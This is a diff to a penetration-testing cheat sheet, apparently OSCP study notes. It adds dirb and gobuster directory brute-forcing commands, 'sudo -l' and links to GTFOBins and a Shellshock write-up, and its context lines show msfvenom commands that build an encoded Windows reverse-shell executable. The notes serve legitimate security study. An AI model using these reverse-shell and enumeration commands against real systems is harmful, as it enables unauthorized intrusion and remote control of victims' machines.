@@ -47,6 +47,33 @@ We can set the following variables when specifying the list file:
 `^USER^`: Replace this string in \<query parameter\> with the username listed in \<username list file\>  
 `^PASSWORD^`: Replace this string in \<query parameter\> with the password listed in \<password list file\>
 
+## Directory
+### dirb
+```
+dirb <target URL>
+```
+
+## File
+#### dirb
+```
+dirb <targetURL> -X <extension list separated by comma (e.g. .sh, .pl, .txt, .php, .py)>
+```
+
+### gobuster
+```
+gobuster dir -x .sh, .pl, .txt, .php, .py -u <target url> -w /usr/share/wordlists/dirb/common.txt -t 100
+```
+
+## Directory
+### dirb
+```
+dirb <target url>
+```
+
+### gobuster
+```
+gobuster dir -u <target url> -w /usr/share/wordlists/dirb/common.txt -t 100
+```
 # JWT (JSON Web Token) exploit
 
 ### Debugger
@@ -77,6 +104,12 @@ The parameter can be specified as follow:
 
 
 # Linux command
+
+## Basic command
+### Show allowing commands as root user
+```
+sudo -l
+```
 ## String Processing
 ### Remove white spaces
 ```
@@ -139,10 +172,21 @@ This tool creates a payload, such as reverse shell, embedded in a file.
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -e x86/shikata_ga_nai -f exe -o evil.exe
 ```
-### exe-service
+#### exe-service
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -e x86/shikata_ga_nai -f exe-service -o evil.exe
 ```
+
+# Others
+
+## References for OSCP
+### GTFOBins
+This website is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.  
+https://gtfobins.github.io/
+
+## References for vulnerabilities
+### Shellshock (CVE-2014-6271)
+https://blog.cloudflare.com/inside-shellshock/
 
 
 
